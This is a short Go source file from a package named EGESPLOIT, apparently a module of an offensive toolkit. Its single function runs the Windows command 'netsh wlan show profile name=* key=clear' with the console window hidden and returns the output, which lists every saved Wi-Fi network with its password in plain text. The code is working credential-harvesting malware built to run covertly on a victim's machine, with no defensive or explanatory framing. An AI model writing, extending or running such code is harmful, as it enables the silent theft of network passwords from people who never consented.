package EGESPLOIT


import "os/exec"
import "syscall"


func WifiList() (string){
  List := exec.Command("cmd", "/C", "netsh wlan show profile name=* key=clear");
  List.SysProcAttr = &syscall.SysProcAttr{HideWindow: true};
  History, _ := List.Output();

  return string(History);	
}